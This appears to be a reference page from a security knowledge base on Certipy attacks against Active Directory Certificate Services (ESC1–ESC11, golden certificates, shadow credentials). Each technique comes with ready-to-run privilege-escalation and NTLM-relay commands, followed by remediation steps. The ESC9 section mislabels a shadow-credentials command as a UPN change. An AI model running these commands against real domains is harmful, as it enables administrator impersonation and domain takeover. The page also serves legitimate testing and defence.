---
title: "Certipy - AD CS Attack Techniques"
category: "reference"
tags:
  - active-directory
  - adcs
  - certificate-attacks
  - privilege-escalation
parent: "certipy"
last_updated: "2025-12-27"
---

# Certipy - AD CS Attack Techniques

## Table of Contents

- [Overview](#overview)
- [ESC1: Misconfigured Certificate Templates](#esc1-misconfigured-certificate-templates)
- [ESC2: Any Purpose EKU](#esc2-any-purpose-eku)
- [ESC3: Enrollment Agent Templates](#esc3-enrollment-agent-templates)
- [ESC4: Vulnerable Template ACLs](#esc4-vulnerable-template-acls)
- [ESC5: Vulnerable PKI Object ACLs](#esc5-vulnerable-pki-object-acls)
- [ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2](#esc6-editf_attributesubjectaltname2)
- [ESC7: Vulnerable CA ACLs](#esc7-vulnerable-ca-acls)
- [ESC8: NTLM Relay to AD CS](#esc8-ntlm-relay-to-ad-cs)
- [ESC9: No Security Extension](#esc9-no-security-extension)
- [ESC10: Weak Certificate Mappings](#esc10-weak-certificate-mappings)
- [ESC11: NTLM Relay to ICPR](#esc11-ntlm-relay-to-icpr)
- [Golden Certificate Attack](#golden-certificate-attack)
- [Shadow Credentials](#shadow-credentials)

## Overview

AD CS (Active Directory Certificate Services) attacks exploit misconfigurations in certificate templates, CA settings, and PKI object permissions to escalate privileges. These are designated ESC1-ESC11 based on the "Certified Pre-Owned" research by SpecterOps.

---

## ESC1: Misconfigured Certificate Templates

**Vulnerability:** Template allows requesters to specify a Subject Alternative Name (SAN), enabling impersonation of any user.

**Requirements:**
- Enterprise CA grants low-privileged users enrollment rights
- Manager approval is disabled
- No authorized signatures required
- Template allows SAN in request (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`)
- Template has EKU that allows authentication (Client Auth, PKINIT, Smart Card Logon)

### Attack

```bash
# Find vulnerable templates
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -vulnerable

# Request certificate with target UPN
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'VulnerableTemplate' -upn administrator@domain.local

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

**Output:** NT hash of the target user, or TGT if using `-no-hash`.

### Remediation

- Remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag from templates
- Enable manager approval for sensitive templates
- Restrict enrollment permissions to required users/groups
- Use certificate mapping that validates SAN against AD attributes

---

## ESC2: Any Purpose EKU

**Vulnerability:** Template has "Any Purpose" EKU or no EKU (SubCA), allowing the certificate to be used for any purpose including client authentication.

### Attack

```bash
# Request certificate with Any Purpose EKU
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'AnyPurposeTemplate'

# Use for authentication
certipy auth -pfx user.pfx -dc-ip 10.10.10.1
```

### Remediation

- Avoid "Any Purpose" EKU in production templates
- Specify explicit EKUs based on actual requirements
- Audit templates with SubCA or blank EKU

---

## ESC3: Enrollment Agent Templates

**Vulnerability:** Two-stage attack using Certificate Request Agent EKU to request certificates on behalf of other users.

**Requirements:**
1. Template with Certificate Request Agent EKU, enrollable by attacker
2. Second template allowing enrollment agents to enroll on behalf of others

### Attack

```bash
# Step 1: Request enrollment agent certificate
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'EnrollmentAgent'

# Step 2: Use enrollment agent cert to request cert for target
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'User' -on-behalf-of 'DOMAIN\administrator' \
    -pfx enrollment_agent.pfx

# Step 3: Authenticate as target
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

### Remediation

- Restrict enrollment agent templates to specific security groups
- Configure "Restrict enrollment agents" on the CA
- Monitor Certificate Request Agent EKU usage

---

## ESC4: Vulnerable Template ACLs

**Vulnerability:** Low-privileged users have write permissions on certificate templates, allowing template modification.

**Dangerous Permissions:**
- `Owner` - Full control
- `FullControl` - Can modify all properties
- `WriteOwner` - Can take ownership
- `WriteDacl` - Can modify permissions
- `WriteProperty` - Can modify template attributes

### Attack

```bash
# Find templates with vulnerable ACLs
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -vulnerable

# Modify template to enable ESC1
certipy template -u user@domain.local -p 'Password123' \
    -template 'VulnerableTemplate' -save-old

# Template is now vulnerable to ESC1, request cert with SAN
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'VulnerableTemplate' -upn administrator@domain.local

# Restore original template configuration
certipy template -u user@domain.local -p 'Password123' \
    -template 'VulnerableTemplate' -configuration old_config.json
```

### Remediation

- Audit template ACLs regularly
- Remove unnecessary write permissions
- Restrict template management to PKI administrators

---

## ESC5: Vulnerable PKI Object ACLs

**Vulnerability:** Write access to PKI-related AD objects (CA server, RootCA container, etc.) can lead to privilege escalation.

**Vulnerable Objects:**
- CA computer object
- CA server's RPC/DCOM server
- NTAuthCertificates container
- Enrollment Services container
- Certificate Templates container

### Attack

Various attacks depending on which object is compromised. Often combined with other ESC attacks.

### Remediation

- Audit PKI object ACLs
- Restrict write access to PKI administrators
- Monitor changes to PKI containers

---

## ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2

**Vulnerability:** CA configured with `EDITF_ATTRIBUTESUBJECTALTNAME2` flag, allowing SAN specification in any certificate request.

### Attack

```bash
# Check if flag is enabled (in certipy find output)
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -text

# Request any template with SAN
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'User' -upn administrator@domain.local

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

### Remediation

```powershell
# Remove the flag from CA configuration
certutil -config "CA-Server\CA-Name" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc
```

---

## ESC7: Vulnerable CA ACLs

**Vulnerability:** Low-privileged users have dangerous permissions on the CA itself.

**Dangerous Permissions:**
- `ManageCA` - Can modify CA configuration
- `ManageCertificates` - Can approve pending requests (Officer)

### Attack (ManageCA + ManageCertificates)

```bash
# Add yourself as officer (requires ManageCA)
certipy ca -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' -add-officer user

# Enable SubCA template (requires ManageCA)
certipy ca -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -enable-template 'SubCA'

# Request SubCA certificate (will be pending)
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'SubCA' -upn administrator@domain.local

# Approve your own request (requires ManageCertificates/Officer)
certipy ca -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -issue-request <request_id>

# Retrieve the issued certificate
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -retrieve <request_id>
```

### Remediation

- Audit CA permissions
- Separate ManageCA and ManageCertificates roles
- Restrict to dedicated PKI administrators

---

## ESC8: NTLM Relay to AD CS

**Vulnerability:** AD CS HTTP enrollment endpoints (Web Enrollment, CES) vulnerable to NTLM relay.

### Attack

```bash
# Start Certipy relay (listens on port 445)
certipy relay -ca ca.domain.local -template 'DomainController'

# Coerce authentication (e.g., PetitPotam, PrinterBug)
python3 PetitPotam.py attacker_ip dc01.domain.local

# Certificate is automatically requested and saved
# Authenticate with the certificate
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
```

### Remediation

- Enable EPA (Extended Protection for Authentication) on IIS
- Disable NTLM authentication on AD CS endpoints
- Require HTTPS with channel binding
- Disable unnecessary HTTP enrollment endpoints

---

## ESC9: No Security Extension

**Vulnerability:** When `StrongCertificateBindingEnforcement` is not set to 2, and a template has `CT_FLAG_NO_SECURITY_EXTENSION`, the `szOID_NTDS_CA_SECURITY_EXT` is not embedded, allowing certificate mapping bypass.

### Attack

Requires ability to modify target user's `userPrincipalName`:

```bash
# Change victim's UPN to target (requires GenericWrite on user)
certipy shadow -u attacker@domain.local -p 'Password123' \
    -account victim -target victim.domain.local

# Or use alternative techniques to modify UPN
# Then request certificate with vulnerable template
certipy req -u victim@domain.local -p 'VictimPass' -ca 'CORP-DC-CA' \
    -template 'VulnerableTemplate'
```

### Remediation

- Set `StrongCertificateBindingEnforcement` to 2 (Full enforcement mode)
- Remove `CT_FLAG_NO_SECURITY_EXTENSION` from templates

---

## ESC10: Weak Certificate Mappings

**Vulnerability:** Weak certificate mappings (Registry key `CertificateMappingMethods` includes `UPN` or `S4U2Self`) allow impersonation when you can modify a user's UPN.

### Attack

```bash
# Modify victim's UPN to match target
# Request certificate as victim
certipy req -u victim@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'User'

# Change victim's UPN to target
# Authenticate with certificate (maps to new UPN)
certipy auth -pfx victim.pfx -dc-ip 10.10.10.1
```

### Remediation

- Use strong certificate mapping methods
- Set `StrongCertificateBindingEnforcement` to 2
- Disable weak mapping methods in registry

---

## ESC11: NTLM Relay to ICPR

**Vulnerability:** IF_ENFORCEENCRYPTICERTREQUEST not set on CA, allowing NTLM relay to RPC certificate enrollment endpoint.

### Attack

```bash
# Start relay targeting RPC endpoint
certipy relay -ca ca.domain.local -template 'Machine'

# Coerce authentication from DC
python3 PetitPotam.py attacker_ip dc01.domain.local
```

### Remediation

- Enable `IF_ENFORCEENCRYPTICERTREQUEST` on CA
- Require RPC encryption

---

## Golden Certificate Attack

**Vulnerability:** With CA private key and certificate, attacker can forge any certificate.

### Attack

```bash
# Backup CA certificate and private key (requires CA admin access)
certipy ca -u admin@domain.local -p 'Password123' -ca 'CORP-DC-CA' -backup

# Forge certificate for any user
certipy forge -ca-pfx ca.pfx -upn administrator@domain.local \
    -subject 'CN=Administrator,CN=Users,DC=domain,DC=local'

# Authenticate with forged certificate
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.1
```

### Remediation

- Protect CA private key with HSM
- Monitor CA backup operations
- Rotate CA if compromise suspected

---

## Shadow Credentials

**Vulnerability:** Attacker with write access to `msDS-KeyCredentialLink` can add their own key and authenticate via PKINIT.

### Attack

```bash
# Add shadow credentials (requires GenericWrite on target)
certipy shadow -u attacker@domain.local -p 'Password123' \
    -account victim -device-id 'uniqueid'

# Authenticate using shadow credentials
certipy shadow -u attacker@domain.local -p 'Password123' \
    -account victim -device-id 'uniqueid' -auth

# Clean up (remove shadow credentials)
certipy shadow -u attacker@domain.local -p 'Password123' \
    -account victim -device-id 'uniqueid' -clear
```

### Remediation

- Monitor modifications to `msDS-KeyCredentialLink`
- Restrict write permissions on user/computer objects
- Enable logging for PKINIT authentication

---

## Attack Summary Table

| ESC | Vulnerability | Privilege Required | Impact |
|-----|--------------|-------------------|--------|
| ESC1 | SAN in request allowed | Enrollment rights | Any user impersonation |
| ESC2 | Any Purpose/No EKU | Enrollment rights | Authentication as self |
| ESC3 | Enrollment agent abuse | Enrollment rights | Any user impersonation |
| ESC4 | Template write access | Template write | Any user impersonation |
| ESC5 | PKI object write access | Object write | Various |
| ESC6 | CA SAN flag enabled | Enrollment rights | Any user impersonation |
| ESC7 | CA manage permissions | ManageCA/Certs | Any user impersonation |
| ESC8 | HTTP relay | Coercion | Machine impersonation |
| ESC9 | No security extension | GenericWrite | Any user impersonation |
| ESC10 | Weak mapping | GenericWrite | Any user impersonation |
| ESC11 | RPC relay | Coercion | Machine impersonation |
| Golden | CA key backup | CA admin | Persistent domain access |
| Shadow | KeyCredentialLink write | GenericWrite | Target impersonation |

## References

- [Certified Pre-Owned - SpecterOps](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [Certipy 4.0 - ESC9 & ESC10](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-attack-paths-and-more-6adaef1a11e8)
- [AD CS Relay Attacks - ESC8](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
